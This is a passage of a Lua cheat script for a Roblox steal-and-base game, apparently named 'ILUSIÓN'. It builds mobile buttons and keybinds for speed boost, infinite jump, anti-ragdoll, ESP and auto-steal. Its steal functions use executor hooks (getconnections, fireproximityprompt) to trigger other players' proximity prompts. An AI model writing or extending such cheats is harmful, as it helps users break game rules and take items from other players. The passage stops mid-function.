	st.Thickness = 1
	st.Transparency = 0.35
	st.Color = Color3.fromRGB(120, 120, 120)
	st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local function styleMode(on)
 if on then
 btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 btn.TextColor3 = Color3.fromRGB(0, 0, 0)
 st.Color = Color3.fromRGB(255, 255, 255)
 st.Transparency = 0.1
 else
 btn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
 btn.TextColor3 = Color3.fromRGB(255, 255, 255)
 st.Color = Color3.fromRGB(120, 120, 120)
 st.Transparency = 0.35
 end
	end
	styleMode(St.activeMode == name)
	local dragging, dragStart, startPos, moved = false, nil, nil, false
	local movedDistance = 0
	local TAP_MAX = 22
	btn.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 moved = false
 movedDistance = 0
 dragStart = input.Position
 startPos = holder.Position
 end
	end)
	btn.InputChanged:Connect(function(input)
 if not dragging or not dragStart then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - dragStart
 movedDistance = d.Magnitude
 if movedDistance > 8 then moved = true end
 if not St.guiLock and moved then
 holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end
	end)
	local function pick()
 setActiveMode(name)
 -- refresh all mode styles
 for n, e in pairs(modeRefs) do
 if e and e.btn and e.style then
 e.style(St.activeMode == n)
 elseif e and e.btn then
 local on = St.activeMode == n
 e.btn.BackgroundColor3 = on and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(28, 28, 28)
 e.btn.TextColor3 = on and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
 end
 end
 styleMode(true)
	end
	btn.InputEnded:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
 if not dragging then return end
 dragging = false
 if not moved and movedDistance < TAP_MAX then
 pick()
 elseif moved and not St.guiLock then
 savePos(holder, "M_" .. name)
 end
 movedDistance = 0
 dragStart = nil
	end)
	btn.MouseButton1Click:Connect(function()
 if moved then return end
 pick()
	end)
	btn.Activated:Connect(function()
 if moved then return end
 pick()
	end)
	modeRefs[name] = { holder = holder, btn = btn, style = styleMode }
end


function makeActBtn(key, label, pos, cb)
	-- Mobile button: dễ bấm — steal/sentry/drop/insta/tp cùng độ nhạy
	local baseSz = (key == "antitrap") and 60 or (St.btnSizes[key] or 50)
	-- Anti Trap is always 60x60; other action buttons keep the user's configured scale.
	local sz = (key == "antitrap") and 60 or math.max(28, math.floor(baseSz * (St.btnScale or 1)))
	local holder = Instance.new("Frame")
	holder.Name = "A_" .. key
	holder.Size = UDim2.new(0, sz, 0, sz)
	holder.Position = pos
	holder.BackgroundTransparency = 1
	holder.Active = true -- nhận touch
	holder.ZIndex = 50
	holder.Parent = ActGui
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 1, 0)
	btn.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
	btn.Text = label
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.TextSize = math.clamp(math.floor(sz * 0.22), 10, 16)
	btn.Font = Enum.Font.GothamBold
	btn.TextWrapped = true
	btn.AutoButtonColor = false
	btn.Active = true
	btn.Selectable = true
	btn.Modal = false
	btn.ZIndex = 100
	btn.Parent = holder
	-- Action buttons: shape từ Settings (Round/Box/Square)
	applyCorner(btn, St.btnShape)
	do
 local oldS = btn:FindFirstChildOfClass("UIStroke")
 if oldS then oldS:Destroy() end
 local s = Instance.new("UIStroke")
 s.Name = "BtnBorder"
 s.Color = Color3.fromRGB(220, 220, 235)
 s.Thickness = 2
 s.Transparency = 0.15
 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 s.Parent = btn
	end
	applyEmpireBtnBg(btn, ({drop=1,insta=2,tp=3,sentry=4,steal=5})[key] or 5)
	applyCornerToChildren(btn, St.btnShape)
	local bgImg = btn:FindFirstChild("BtnBgImage")
	if bgImg then
 bgImg.Active = false
 bgImg.Selectable = false
 bgImg.ZIndex = 0
	end
	-- Chữ luôn hiện: TextButton text + label đè trên ảnh
	btn.TextTransparency = 0
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	local oldL = btn:FindFirstChild("BtnTextOverlay")
	if oldL then oldL:Destroy() end
	local tl = Instance.new("TextLabel")
	tl.Name = "BtnTextOverlay"
	tl.BackgroundTransparency = 1
	tl.Size = UDim2.new(1, -4, 1, -4)
	tl.Position = UDim2.new(0, 2, 0, 2)
	tl.Text = label
	tl.TextColor3 = Color3.fromRGB(255, 255, 255)
	tl.TextStrokeTransparency = 0.35
	tl.TextStrokeColor3 = Color3.new(0, 0, 0)
	tl.Font = Enum.Font.GothamBold
	tl.TextScaled = true
	tl.TextWrapped = true
	tl.ZIndex = (btn.ZIndex or 100) + 5
	tl.Active = false
	tl.Parent = btn
	-- ẩn text gốc tránh double (giữ overlay)
	btn.TextTransparency = 1
	local dragging, dragStart, startPos = false, nil, nil
	local movedDistance = 0
	local TAP_MAX = 22 -- dễ bấm / dễ kéo hơn
	local dragThresh = 8 -- kéo nhạy, không nặng
	btn.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 movedDistance = 0
 dragStart = input.Position
 startPos = holder.Position
 end
	end)
	-- UIS global = mượt hơn InputChanged trên button
	UIS.InputChanged:Connect(function(input)
 if not dragging or not dragStart then return end
 if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
 local d = input.Position - dragStart
 movedDistance = d.Magnitude
 if St.guiLock then return end
 if movedDistance > dragThresh then
 holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
	end)
	btn.InputEnded:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
 if not dragging then return end
 dragging = false
 local tapLimit = TAP_MAX
 -- steal/sentry/drop/insta/tp: dễ bấm hơn
 if key == "steal" or key == "sentry" or key == "drop" or key == "insta" or key == "tp" then
 tapLimit = 48
 end
 if movedDistance < tapLimit then
 if cb then
 btn:SetAttribute("_lastTap", tick())
 pcall(cb)
 if key == "sentry" then
 if _G.IlusionRefreshSentryBtn then pcall(_G.IlusionRefreshSentryBtn) end
 elseif key == "steal" then
 if _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
 end
 end
 else
 if not St.guiLock then
 savePos(holder, "A_" .. key)
 end
 end
 movedDistance = 0
 dragStart = nil
	end)
	local function backupClick()
 local last = btn:GetAttribute("_lastTap") or 0
 if tick() - last < 0.15 then return end
 btn:SetAttribute("_lastTap", tick())
 if cb then pcall(cb) end
 if key == "sentry" and _G.IlusionRefreshSentryBtn then pcall(_G.IlusionRefreshSentryBtn) end
 if key == "steal" and _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
	end
	btn.MouseButton1Click:Connect(backupClick)
	btn.Activated:Connect(backupClick)
	-- overlay không chặn click
	local ov = btn:FindFirstChild("BtnTextOverlay")
	if ov then ov.Active = false; ov.Selectable = false end

	-- STEAL / SENTRY: phản hồi ngay + màu xanh đậm
	if key == "steal" or key == "sentry" then
 local function instantToggle()
 local last = btn:GetAttribute("_lastTap") or 0
 if tick() - last < 0.12 then return end
 btn:SetAttribute("_lastTap", tick())
 if key == "steal" then
 local on = not (St.autoSteal == true)
 if type(setAutoSteal) == "function" then pcall(setAutoSteal, on)
 elseif type(_G.setAutoSteal) == "function" then pcall(_G.setAutoSteal, on)
 else
 St.autoSteal = on
 autoStealEnabled = on
 if on and type(startAutoSteal)=="function" then pcall(startAutoSteal)
 elseif (not on) and type(stopAutoSteal)=="function" then pcall(stopAutoSteal) end
 end
 applyActBtnState(btn, St.autoSteal == true, "STEAL\nON", "AUTO\nSTEAL")
 if _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
 else
 local on = not (St.destroySentry == true)
 if type(setDestroySentry) == "function" then pcall(setDestroySentry, on)
 else St.destroySentry = on end
 applyActBtnState(btn, St.destroySentry == true, "SENTRY\nON", "SENTRY")
 if _G.IlusionRefreshSentryBtn then pcall(_G.IlusionRefreshSentryBtn) end
 end
 end
 btn.MouseButton1Down:Connect(instantToggle)
 btn.TouchTap:Connect(function() end) -- ensure touch focus
 -- thay cb để InputEnded cũng dùng logic này
 cb = instantToggle
	end

	actRefs[key] = { holder = holder, btn = btn }
end

function restorePos(holder, key, defaultPos)
	local t = St._btnPos and St._btnPos[key]
	if type(t) == "table" and t[1] ~= nil then
 holder.Position = UDim2.new(tonumber(t[1]) or 0, tonumber(t[2]) or 0, tonumber(t[3]) or 0, tonumber(t[4]) or 0)
 if t[5] and t[6] then
 local s = tonumber(t[5])
 local h = tonumber(t[6])
 if s and h and s > 10 and h > 10 then
 holder.Size = UDim2.new(0, s, 0, h)
 end
 end
	elseif defaultPos then
 holder.Position = defaultPos
	end
end

function savePos(holder, key)
	St._btnPos = St._btnPos or {}
	St._btnPos[key] = {
 holder.Position.X.Scale, holder.Position.X.Offset,
 holder.Position.Y.Scale, holder.Position.Y.Offset,
 holder.Size.X.Offset, holder.Size.Y.Offset
	}
	saveCfg()
end

function rebuildMobile()
	for _, e in pairs(modeRefs) do if e.holder then e.holder:Destroy() end end
	for _, e in pairs(actRefs) do if e.holder then e.holder:Destroy() end end
	modeRefs, actRefs = {}, {}
	makeModeBtn("Normal", 1)
	makeModeBtn("Lagger", 2)
	makeModeBtn("Custom", 3)
	-- Full Speed V2 GUI bar
	pcall(function()
 if ModeGui then
 for _, ch in ipairs(ModeGui:GetChildren()) do
 if ch:IsA("Frame") and tostring(ch.Name):match("^M_") then
 ch.Visible = false
 end
 end
 end
 if _G.IlusionBuildV2ModeBar then _G.IlusionBuildV2ModeBar() end
 if St.speedOn then
 currentSpeedValue = getActiveMoveSpeed()
 pcall(startSpeedBoost)
 end
	end)
	makeActBtn("drop", "DROP", UDim2.new(1, -150, 0.5, -40), function() runDrop() if _G.IlusionCounterOnDrop then pcall(_G.IlusionCounterOnDrop) end end)
	makeActBtn("insta", "INSTA\nRESET", UDim2.new(1, -80, 0.5, -40), doInstaReset)
	makeActBtn("tp", "TP\nDOWN", UDim2.new(1, -80, 0.5, 30), function() doTPDown(true) end)
	makeActBtn("sentry", "SENTRY", UDim2.new(1, -150, 0.5, 30), function()
 local on = not (St.destroySentry == true)
 if type(setDestroySentry) == "function" then
 setDestroySentry(on)
 else
 St.destroySentry = on
 end
 if _G.IlusionRefreshSentryBtn then pcall(_G.IlusionRefreshSentryBtn) end
	end)
	makeActBtn("antitrap", "ANTI\nTRAP", UDim2.new(1, -80, 0.5, 100), function()
 antiTrapEnabled = not antiTrapEnabled
 antiTrapStuckTime = 0
 local entry = actRefs and actRefs.antitrap
 if entry and entry.btn then
  applyActBtnState(entry.btn, antiTrapEnabled, "TRAP\nON", "ANTI\nTRAP")
 end
end)
	makeActBtn("steal", "AUTO\nSTEAL", UDim2.new(1, -150, 0.5, 100), function()
 local on = not (St.autoSteal == true)
 if type(setAutoSteal) == "function" then
 setAutoSteal(on)
 elseif type(_G.setAutoSteal) == "function" then
 _G.setAutoSteal(on)
 else
 St.autoSteal = on
 autoStealEnabled = on
 if on and startAutoSteal then startAutoSteal() elseif stopAutoSteal then stopAutoSteal() end
 end
 if _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
 if ToggleRefs and ToggleRefs.autoSteal and ToggleRefs.autoSteal.setVisual then
 pcall(ToggleRefs.autoSteal.setVisual, St.autoSteal == true)
 end
	end)
	-- Mantener el estado visual del botón Anti Trap si se reconstruyen los botones móviles.
 local antiTrapEntry = actRefs and actRefs.antitrap
 if antiTrapEntry and antiTrapEntry.btn and type(applyActBtnState) == "function" then
  applyActBtnState(antiTrapEntry.btn, antiTrapEnabled, "TRAP\nON", "ANTI\nTRAP")
 end
	-- restore saved positions
	for key, e in pairs(actRefs) do
 if e.holder then
  restorePos(e.holder, "A_" .. key)
  if key == "antitrap" then e.holder.Size = UDim2.new(0, 60, 0, 60) end
 end
	end
	for key, e in pairs(modeRefs) do
 if e.holder then restorePos(e.holder, "M_" .. key) end
	end
	_G.IlusionRefreshModeBar()
	_G.IlusionRefreshSentryBtn()
	if _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
end



-- Empire-style: nút ON = xanh đậm rõ, OFF = tối
function applyActBtnState(btn, on, onText, offText)
 if not btn then return end
 on = on and true or false
 -- Match the Speed buttons: black when OFF, white when ON, with a light border.
 btn.BackgroundTransparency = 0
 btn.BackgroundColor3 = on and Color3.fromRGB(245, 245, 245) or Color3.fromRGB(18, 18, 18)
 btn.TextColor3 = on and Color3.fromRGB(10, 10, 10) or Color3.fromRGB(255, 255, 255)
 if onText and on then btn.Text = onText elseif offText then btn.Text = offText end
 local bgImg = btn:FindFirstChild("BtnBgImage")
 if bgImg then bgImg:Destroy() end
 local dim = btn:FindFirstChild("BtnDim")
 if dim then dim:Destroy() end
 local tl = btn:FindFirstChild("BtnTextOverlay")
 if tl then
  if onText and on then tl.Text = onText elseif offText then tl.Text = offText end
  tl.TextColor3 = on and Color3.fromRGB(10, 10, 10) or Color3.fromRGB(255, 255, 255)
  tl.TextStrokeTransparency = 1
 end
 local st = btn:FindFirstChild("BtnBorder") or btn:FindFirstChildOfClass("UIStroke")
 if not st then st = Instance.new("UIStroke"); st.Name = "BtnBorder"; st.Parent = btn end
 st.Color = Color3.fromRGB(225, 225, 225)
 st.Transparency = 0.12
 st.Thickness = 1.5
 st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
end

function _G.IlusionRefreshStealBtn()
	local e = actRefs and actRefs.steal
	if not e or not e.holder then return end
	local show = (St.showStealBtn ~= false)
	e.holder.Visible = show
	if e.btn then
 e.btn.Visible = show
 applyActBtnState(e.btn, St.autoSteal == true, "STEAL\nON", "AUTO\nSTEAL")
	end
end

function _G.IlusionRefreshSentryBtn()
	local e = actRefs and actRefs.sentry
	if e and e.btn then
 applyActBtnState(e.btn, St.destroySentry == true, "SENTRY\nON", "SENTRY")
	end
end


function _G.IlusionRefreshModeBar()
	for n, e in pairs(modeRefs) do
 if e and e.btn then
 local on = St.activeMode == n
 applyCorner(e.btn, "Square")
 if on then
 e.btn.BackgroundColor3 = C.modeOnBg or Color3.fromRGB(255, 20, 147)
 e.btn.BackgroundTransparency = 0
 e.btn.TextColor3 = C.modeOnTxt or Color3.fromRGB(255, 255, 255)
 local tl = e.btn:FindFirstChild("BtnTextOverlay")
 if tl then
 tl.TextColor3 = Color3.fromRGB(255, 255, 255)
 tl.Text = n
 end
 local st = e.btn:FindFirstChildOfClass("UIStroke")
 if st then st.Color = Color3.fromRGB(255, 255, 255); st.Transparency = 0.05 end
 else
 e.btn.BackgroundColor3 = C.modeOffBg or Color3.fromRGB(255, 255, 255)
 e.btn.BackgroundTransparency = 0
 e.btn.TextColor3 = C.modeOffTxt or Color3.fromRGB(25, 25, 30)
 local tl = e.btn:FindFirstChild("BtnTextOverlay")
 if tl then
 tl.TextColor3 = Color3.fromRGB(25, 25, 30)
 tl.Text = n
 end
 local st = e.btn:FindFirstChildOfClass("UIStroke")
 if st then st.Color = Color3.fromRGB(120, 120, 120); st.Transparency = 0.2 end
 end
 end
	end
end

-- Cập nhật size + shape TRỰC TIẾP (không destroy → giữ vị trí kéo)
_G.IlusionForceApplyShape = function(shape)
	shape = shape or (St and St.btnShape) or "Square"
	if St then St.btnShape = shape end
	local refs = actRefs
	if type(refs) ~= "table" then return end
	for key, e in pairs(refs) do
 if e and e.btn then
 pcall(function()
 applyCorner(e.btn, shape)
 if applyCornerToChildren then applyCornerToChildren(e.btn, shape) end
 end)
 end
	end
end

function _G.IlusionUpdateMobileVisuals()
	for n, e in pairs(modeRefs) do
 if e and e.holder and e.btn then
 local sc = tonumber(St.btnScale) or 1
 local w = math.max(80, math.floor(98 * sc))
 local h = math.max(32, math.floor(36 * sc))
 e.holder.Size = UDim2.new(0, w, 0, h)
 e.btn.TextSize = math.clamp(math.floor(h * 0.36), 11, 14)
 local c = e.btn:FindFirstChildOfClass("UICorner") or Instance.new("UICorner", e.btn)
 c.CornerRadius = UDim.new(0, 12) -- V2 bo góc chữ nhật
 if e.style then e.style(St.activeMode == n) end
 end
	end
	for key, e in pairs(actRefs) do
 if e and e.holder and e.btn then
 local base = (key == "antitrap") and 60 or (St.btnSizes[key] or 50)
 -- Anti Trap remains exactly 60x60; other buttons follow their configured scale.
 local sz = (key == "antitrap") and 60 or math.max(28, math.floor(base * (St.btnScale or 1)))
 e.holder.Size = UDim2.new(0, sz, 0, sz)
 e.btn.TextSize = math.clamp(math.floor(sz * 0.22), 10, 16)
 applyCorner(e.btn, St.btnShape or "Square")
 applyCornerToChildren(e.btn, St.btnShape or "Square")
 -- viền
 local s = e.btn:FindFirstChild("BtnBorder") or e.btn:FindFirstChildOfClass("UIStroke")
 if not s then
 s = Instance.new("UIStroke")
 s.Name = "BtnBorder"
 s.Parent = e.btn
 end
 s.Color = Color3.fromRGB(220, 220, 235)
 s.Thickness = 2
 s.Transparency = 0.15
 end
	end
	if _G.IlusionRefreshModeBar then pcall(_G.IlusionRefreshModeBar) end
	if _G.IlusionRefreshSentryBtn then pcall(_G.IlusionRefreshSentryBtn) end
	if _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
	-- Scale Speed V2 mode bar
	pcall(function()
 local gui = PlayerGui:FindFirstChild("IlusionV2ModeBar")
 if not gui then return end
 local sc = tonumber(St.btnScale) or 1
 local modeSz = tonumber(St.btnSizes and St.btnSizes.mode) or 50
 -- Size Speed 3Mode: tăng chiều cao; width ổn định
 local h = math.max(28, math.floor(modeSz * sc))
 local w = h -- square speed buttons, same shape as the other mobile buttons
 for _, holder in ipairs(gui:GetChildren()) do
 if holder:IsA("Frame") and holder.Name:match("^V2MH_") then
 holder.Size = UDim2.new(0, w, 0, h)
 local btn = holder:FindFirstChildWhichIsA("TextButton")
 if btn then
 btn.TextSize = math.clamp(math.floor(h * 0.36), 9, 16)
 end
 end
 end
	end)
end

function _G.IlusionApplyMobile()
	ModeGui.Enabled = St.mobileBtns == true
	ActGui.Enabled = St.mobileBtns == true
	local hasMode = next(modeRefs) ~= nil
	local hasAct = next(actRefs) ~= nil
	if not hasMode or not hasAct then
 rebuildMobile()
	end
	-- luôn áp shape/size (Box/Round/Square) kể cả khi đã có nút
	if _G.IlusionUpdateMobileVisuals then pcall(_G.IlusionUpdateMobileVisuals) end
end
function _G.IlusionResetMobilePos()
	St._btnPos = {}
	rebuildMobile()
	pcall(saveCfg)
end
_G.IlusionApplyMobile()

----------------------------------------------------------------
-- KEYBINDS (Drop / TP / Insta / Mode) — no menu toggle key
----------------------------------------------------------------
UIS.InputBegan:Connect(function(input, gp)
	if gp or listening then return end
	if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
	local k = input.KeyCode
	if k == St.keys.Drop then runDrop()
	elseif k == St.keys.TPDown then doTPDown(true)
	elseif k == St.keys.InstaReset then doInstaReset()
	elseif k == St.keys.DestroySentry then setDestroySentry(not St.destroySentry)
	elseif St.keys.AutoSteal and k == St.keys.AutoSteal then
 if type(setAutoSteal) == "function" then
 setAutoSteal(not (St.autoSteal == true))
 -- sync toggle UI
 if ToggleRefs and ToggleRefs.autoSteal and ToggleRefs.autoSteal.setVisual then
 pcall(ToggleRefs.autoSteal.setVisual, St.autoSteal == true)
 end
 end
	else
 for name, m in pairs(St.modes) do
 if m.key == k then setActiveMode(name) break end
 end
	end
end)

----------------------------------------------------------------
-- BOOT
----------------------------------------------------------------

-- ============================================================
-- REAPPLY ALL LOGIC (fix/rejoin/respawn) — không nút ảo
-- ============================================================
function reapplyAllLogic(reason)
	reason = tostring(reason or "boot")
	-- Speed
	pcall(function()
 if St.speedOn then
 -- force restart loop
 if speedConnection then
 pcall(function() speedConnection:Disconnect() end)
 speedConnection = nil
 end
 startSpeedBoost()
 if St.activeMode and setActiveMode then setActiveMode(St.activeMode) end
 else
 if stopSpeedBoost then stopSpeedBoost() end
 end
	end)
	-- Inf Jump
	pcall(function()
 if St.infJump then
 InfJumpState.enabled = true
 InfJumpState.mode = St.infJumpMode or "hold"
 if startInfJump then startInfJump() elseif setInfJump then setInfJump(true) end
 else
 if stopInfJump then stopInfJump() end
 end
	end)
	-- Anti ragdoll
	pcall(function()
 if St.antiRagdoll then
 if AntiRagdollV2 then AntiRagdollV2.Enabled = true end
 if startAntiRagdoll then startAntiRagdoll() end
 else
 if stopAntiRagdoll then stopAntiRagdoll() end
 end
	end)
	-- Anti FX flags
	pcall(function()
 if AntiFX then
 AntiFX.gummy = true
 AntiFX.boogie = true
 AntiFX.paint = true
 St.antiGummy = true
 St.antiBoogie = true
 St.antiPaint = true
 end
	end)
	-- Tool aim + rehook
	pcall(function()
 if St.toolAim then
 aimOn = true
 local char = LP.Character
 if char and watchTools then watchTools(char) end
 local bp = LP:FindFirstChild("Backpack")
 if bp and watchTools then watchTools(bp) end
 else
 aimOn = false
 end
	end)
	-- Destroy sentry
	pcall(function()
 if St.destroySentry and setDestroySentry then setDestroySentry(true) end
	end)
	-- ESP / tracer / antilag
	pcall(function() if St.esp and setESP then setESP(true) end end)
	pcall(function() if St.tracer and setTracer then setTracer(true) end end)
	pcall(function() if St.antiLag and setAntiLag then setAntiLag(true) end end)
	-- Spam
	pcall(function() if St.spamLaser and setSpamLaser then setSpamLaser(true) end end)
	pcall(function() if St.spamPaint and setSpamPaint then setSpamPaint(true) end end)
	-- Auto steal
	pcall(function()
 if St.autoSteal then
 if type(setAutoSteal) == "function" then setAutoSteal(true) end
 if _G.IlusionSyncAutoSteal then pcall(_G.IlusionSyncAutoSteal) end
 end
	end)
	-- Ragdoll TP
	pcall(function()
	end)
	-- Mobile buttons
	pcall(function()
 if ModeGui then ModeGui.Enabled = St.mobileBtns == true end
 if ActGui then ActGui.Enabled = St.mobileBtns == true end
 if _G.IlusionApplyMobile then pcall(_G.IlusionApplyMobile) end
	end)
	-- Sync toggle UI + ép logic chạy nếu đang ON
	pcall(function()
 for name, ref in pairs(ToggleRefs or {}) do
 if ref and St[name] ~= nil then
 local on = St[name] == true
 if ref.setVisual then
 pcall(ref.setVisual, on)
 end
 end
 end
	end)
end
_G.IlusionReapplyAllLogic = reapplyAllLogic


-- Re-apply ALL saved states so toggles that show ON actually work
pcall(function() setAntiGummy(St.antiGummy ~= false) end)
pcall(function() setAntiBoogie(St.antiBoogie ~= false) end)
pcall(function() setAntiPaint(St.antiPaint ~= false) end)
pcall(function() setAntiRagdoll(St.antiRagdoll == true) end)
pcall(function() if _G.IlusionApplyToolButtons then _G.IlusionApplyToolButtons() end end)
pcall(function()
	if AntiBeeModule and St.antiBee == true then
		AntiBeeModule.set(true)
	end
end)
pcall(function() setToolAim(St.toolAim ~= false) end)
pcall(function() setInfJump(St.infJump ~= false) end)
pcall(function() setDestroySentry(St.destroySentry == true) end)
pcall(function() setSpeedOn(St.speedOn ~= false) end)
pcall(function() setActiveMode(St.activeMode or "Normal") end)
pcall(function() setESP(St.esp == true) end)
pcall(function() if St.trapEsp and setTrapESP then setTrapESP(true) end end)
pcall(function() setTracer(St.tracer == true) end)
pcall(function() setAntiLag(St.antiLag == true) end)
pcall(function() setSpamLaser(St.spamLaser == true) end)
pcall(function() setSpamPaint(St.spamPaint == true) end)
-- Auto Steal after setups exist
task.defer(function()
	pcall(function()
 if type(setAutoSteal) == "function" then
 setAutoSteal(St.autoSteal == true)
 end
 if St.autoSteal and _G.IlusionSyncAutoSteal then
 pcall(_G.IlusionSyncAutoSteal)
 end
	end)
end)
pcall(applyMenuScale)
pcall(function() setTab("Player") end)
task.defer(function()
	task.wait(0.6)
	pcall(function() if reapplyAllLogic then reapplyAllLogic("boot") end end)
end)
task.defer(function()
	-- rejoin server: re-apply sau 2s (chờ character/plot load)
	task.wait(2)
	pcall(function() if reapplyAllLogic then reapplyAllLogic("boot-delayed") end end)
end)
-- Sync toggle UI to match actual state
task.defer(function()
	-- sync toggle UI
	for name, ref in pairs(ToggleRefs or {}) do
 if ref and ref.set and St[name] ~= nil then
 pcall(function() ref.set(St[name] == true) end)
 end
	end
	-- force-apply runtime features (sau load / rejoin) — logic thật, không chỉ UI
	pcall(function() if St.speedOn and startSpeedBoost then startSpeedBoost() end end)
	pcall(function() if St.antiRagdoll and startAntiRagdoll then startAntiRagdoll() end end)
	pcall(function()
 if St.infJump then
 InfJumpState.enabled = true
 InfJumpState.mode = St.infJumpMode or "hold"
 end
	end)
	pcall(function() if St.toolAim and setToolAim then setToolAim(true) end end)
	pcall(function()
 if ModeGui then ModeGui.Enabled = St.mobileBtns == true end
 if ActGui then ActGui.Enabled = St.mobileBtns == true end
 if next(modeRefs) == nil or next(actRefs) == nil then
 if _G.IlusionApplyMobile then _G.IlusionApplyMobile() end
 end
	end)
	pcall(function() if St.activeMode and setActiveMode then setActiveMode(St.activeMode) end end)
	pcall(function() if St.autoSteal and type(setAutoSteal) == "function" then setAutoSteal(true) end end)
	pcall(function() if St.destroySentry and setDestroySentry then setDestroySentry(true) end end)
end)


-- Re-apply features on respawn / rejoin (full logic, không nút ảo)
if _G._VisHubCharReapplyConn then
	pcall(function() _G._VisHubCharReapplyConn:Disconnect() end)
	_G._VisHubCharReapplyConn = nil
end
_G._VisHubCharReapplyConn = LP.CharacterAdded:Connect(function(char)
	task.wait(0.4)
	pcall(function()
 if reapplyAllLogic then
 reapplyAllLogic("CharacterAdded")
 else
 if St.speedOn and startSpeedBoost then
 if speedConnection then pcall(function() speedConnection:Disconnect() end); speedConnection = nil end
 startSpeedBoost()
 end
 if St.infJump and setInfJump then setInfJump(true) end
 if St.antiRagdoll and startAntiRagdoll then startAntiRagdoll() end
 if St.toolAim and setToolAim then setToolAim(true) end
 if St.autoSteal and _G.IlusionSyncAutoSteal then pcall(_G.IlusionSyncAutoSteal) end
 end
	end)
end)

print("[ILUSIÓN Full] Player(Anti+Speed S2+Aim+Drop+Insta) | ESP | Settings mobile/lock/shape/size")



-- ============================================================
-- EXTENSION: InfJump 2-mode | Auto Steal V1/V2 | Steal Bar | Panel TP
-- ============================================================

-- InfJump mode: hold | manual
St.infJumpMode = St.infJumpMode or "hold"
-- setInfJumpMode already defined above

function isMyPlot(plotName)
	local plots = workspace:FindFirstChild("Plots")
	local plot = plots and plots:FindFirstChild(plotName)
	if not plot then return false end
	local sign = plot:FindFirstChild("PlotSign")
	local yb = sign and sign:FindFirstChild("YourBase")
	return yb and yb:IsA("BillboardGui") and yb.Enabled
end

function findStealPrompt()
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then return nil, nil end
	local radius = St.stealRadius or 60
	local best, bestDist, bestPart = nil, math.huge, nil
	local function consider(d)
 if not isStealAction(d) then return end
 if d.Enabled == false then return end
 if LP.Character and d:IsDescendantOf(LP.Character) then return end
 local part = d.Parent
 local basePart = part and (part:IsA("BasePart") and part
 or part:FindFirstChildWhichIsA("BasePart", true)
 or d:FindFirstAncestorWhichIsA("BasePart"))
 if not basePart then return end
 local plot = d
 for _ = 1, 8 do
 if not plot.Parent or plot.Parent == workspace then break end
 plot = plot.Parent
 if isOwnPlot(plot) then return end
 end
 local dist = (basePart.Position - root.Position).Magnitude
 if dist <= radius and dist < bestDist then
 best, bestDist, bestPart = d, dist, basePart
 end
	end
	local plots = workspace:FindFirstChild("Plots") or workspace:FindFirstChild("plots")
	if plots then
 for _, plot in ipairs(plots:GetChildren()) do
 if not isOwnPlot(plot) then
 for _, d in ipairs(plot:GetDescendants()) do
 if d:IsA("ProximityPrompt") then consider(d) end
 end
 end
 end
	else
 for _, d in ipairs(workspace:GetDescendants()) do
 if d:IsA("ProximityPrompt") then consider(d) end
 end
	end
	return best, bestPart
end

function fireSteal(prompt)
	if not prompt then return end
	if not StealA.data[prompt] then
 StealA.data[prompt] = { hold = {}, trigger = {} }
 if getconnections then
 pcall(function()
 for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan) or {}) do
 if c.Function then table.insert(StealA.data[prompt].hold, c.Function) end
 end
 for _, c in ipairs(getconnections(prompt.Triggered) or {}) do
 if c.Function then table.insert(StealA.data[prompt].trigger, c.Function) end
 end
 end)
 end
	end
	local data = StealA.data[prompt]
	for _, fn in ipairs(data.hold) do task.spawn(fn) end
	for _, fn in ipairs(data.trigger) do task.spawn(fn) end
	if #data.hold == 0 and #data.trigger == 0 and fireproximityprompt then
 pcall(function() fireproximityprompt(prompt) end)
	end
end

function executeStealV1(prompt, part)
	if StealA.busy or not prompt then return end
	StealA.busy = true
	local dur = St.stealDuration or 1.4
	local pauseOn = St.stealPause == true
	local pausePct = (St.stealPausePct or 75) / 100
	local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	local function stillInRange()
 if not prompt or not prompt.Parent or not part or not part.Parent then return false end
 local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not r then return false end
 return (r.Position - part.Position).Magnitude <= (St.stealRadius or 60)
	end
	local function closeEnough()
 local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not r or not part then return false end
 return (r.Position - part.Position).Magnitude <= 3
	end

	task.spawn(function()
 -- hold begin
